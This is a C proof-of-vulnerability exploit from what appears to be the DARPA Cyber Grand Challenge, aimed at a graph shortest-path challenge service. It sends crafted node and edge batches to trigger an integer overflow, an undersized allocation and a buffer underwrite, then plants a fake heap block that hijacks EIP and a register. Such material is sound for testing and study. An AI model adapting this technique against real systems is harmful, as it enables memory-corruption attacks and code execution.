/*

Author: Joe Rogers <joe@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libcgc.h>

#define EBP (5)

unsigned int ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int SendBytes(int fd, char *buf, unsigned int len) {
	size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

unsigned int pov_strlen(char *buf) {
	unsigned int len = 0;
	while (*(buf+len) != '\0') {
		len++;
	}
	return(len);
}

unsigned int SendString(int fd, char *buf) {
	unsigned int len = 0;

	return(SendBytes(fd, buf, pov_strlen(buf)));
}

void NegotiateType1Pov(unsigned int ipmask, unsigned int regmask, unsigned int regnum, unsigned int *type1_ip, unsigned int *type1_reg) {
	unsigned int PovType = 1;

	// Request Type 1 negotitation
	if (SendBytes(3, (char *)&PovType, 4) != 4) {
		_terminate(-1);
	}

	// Send the ipmask
	if (SendBytes(3, (char *)&ipmask, 4) != 4) {
		_terminate(-1);
	}

	// Send the regmask
	if (SendBytes(3, (char *)&regmask, 4) != 4) {
		_terminate(-1);
	}

	// Send the register number we'll be controlling
	if (SendBytes(3, (char *)&regnum, 4) != 4) {
		_terminate(-1);
	}

	// get the 4-byte value for eip
	if (ReadBytes(3, (char *)type1_ip, 4) != 4) {
		_terminate(-1);
	} 
	// get the 4-byte value for the register
	if (ReadBytes(3, (char *)type1_reg, 4) != 4) {
		_terminate(-1);
	}

	return;

}

typedef unsigned char uint8_t;
typedef unsigned int uint32_t;
#define CMD_SEND_NODES (1)
#define CMD_SEND_EDGES (2)
#define CMD_RUN_SPT (3)
typedef struct __attribute__((__packed__)) _command {
	uint8_t Action;
	uint32_t NumElements;
	uint32_t StartingNode;
	uint32_t EndingNode;
} Command, *pCommand;
	
int main(void) {
	unsigned int type1_ip;
	unsigned int type1_reg;
	unsigned int i;
	unsigned int j;
	unsigned int z;
	unsigned int weight = 1;
	Command cmd;

	// negotiate a Type1 POV with the Competition Framework
	// we will control eip and edx
	NegotiateType1Pov(0xfefefefe, 0xfefefefe, EBP, &type1_ip, &type1_reg);
	// deal with 0x00 and 0x0a which interfere with this CB's POV
	type1_ip |= 0x01010101;
	type1_reg |= 0x01010101;

	// send 27 commands to get the stack counter where we need it
	cmd.Action = CMD_SEND_NODES;
	cmd.NumElements = 1;
	cmd.StartingNode = 0;
	cmd.EndingNode = 0;
	for (i = 0x200; i < 0x200+27; i++) {
		SendBytes(0, (char *)&cmd, 13);
		if (i == 0x211) {
			j = 0xbaaaaff0;
			SendBytes(0, (char *)&j, 4);
			continue;
		}
		SendBytes(0, (char *)&i, 4);
	}

	// send next batch of 255-27 nodes
	cmd.NumElements = 255-27;
	SendBytes(0, (char *)&cmd, 13);
	for (i = 0x200+27; i < 0x2ff; i++) {
		if (i == 0x2f9) {
			j = 0xb7ff8700;
			SendBytes(0, (char *)&j, 4);
			continue;
		}
		SendBytes(0, (char *)&i, 4);
	}

	// send the 2nd batch of nodes overflowing MAX_NODES
	cmd.NumElements = 100;
	SendBytes(0, (char *)&cmd, 13);
	for (i = 0x2ff; i < 0x2ff+100; i++) {
		SendBytes(0, (char *)&i, 4);
	}

	// 
	// create edges such that the SPT will 
	// be a linear graph from the starting 
	// node to the ending node.  As such
	// the SPT will have > MAX_NODES in it
	// causing the integer overflow, malloc
	// undersizing and buffer underwrite.
	//
	
	// send the first batch of edges
	cmd.Action = CMD_SEND_EDGES;
	cmd.NumElements = 255;
	SendBytes(0, (char *)&cmd, 13);
	for (i = 0x200; i < 0x2ff; i++) {
		z = i+1;
		if (z == 0x2f9) {
			j = 0xb7ff8700;
			SendBytes(0, (char *)&i, 4);
			SendBytes(0, (char *)&j, 4);
			SendBytes(0, (char *)&weight, 4);
			continue;
		}
		if (i == 0x2f9) {
			j = 0xb7ff8700;
			SendBytes(0, (char *)&j, 4);
			SendBytes(0, (char *)&z, 4);
			SendBytes(0, (char *)&weight, 4);
			continue;
		}
		if (z == 0x211) {
			j = 0xbaaaaff0;
			SendBytes(0, (char *)&i, 4);
			SendBytes(0, (char *)&j, 4);
			SendBytes(0, (char *)&weight, 4);
			continue;
		}
		if (i == 0x211) {
			j = 0xbaaaaff0;
			SendBytes(0, (char *)&j, 4);
			SendBytes(0, (char *)&z, 4);
			SendBytes(0, (char *)&weight, 4);
			continue;
		}
		SendBytes(0, (char *)&i, 4);
		SendBytes(0, (char *)&z, 4);
		SendBytes(0, (char *)&weight, 4);
	}

	// send the second batch of edges
	cmd.Action = CMD_SEND_EDGES;
	cmd.NumElements = 99;
	SendBytes(0, (char *)&cmd, 13);
	for (i = 0x2ff; i < 0x2ff+99; i++) {
		z = i+1;
		SendBytes(0, (char *)&i, 4);
		SendBytes(0, (char *)&z, 4);
		SendBytes(0, (char *)&weight, 4);
	}

	// send the run spt command
	cmd.Action = CMD_RUN_SPT;
	cmd.NumElements = 0;
	cmd.StartingNode = 0x200;
	cmd.EndingNode = 0x2ff+9;
	SendBytes(0, (char *)&cmd, 13);

	// read the response
	
	// send a new allocation request
	// causing the fake malloc block to be used
	cmd.Action = CMD_SEND_NODES;
	cmd.NumElements = 3;
	cmd.StartingNode = 0;
	cmd.EndingNode = 0;
	SendBytes(0, (char *)&cmd, 13);
	for (i = 0xaaaaaaaa; i < 0xaaaaaaaa+1; i++) {
		SendBytes(0, (char *)&i, 4);
	}
	SendBytes(0, (char *)&type1_reg, 4);
	SendBytes(0, (char *)&type1_ip, 4);
}
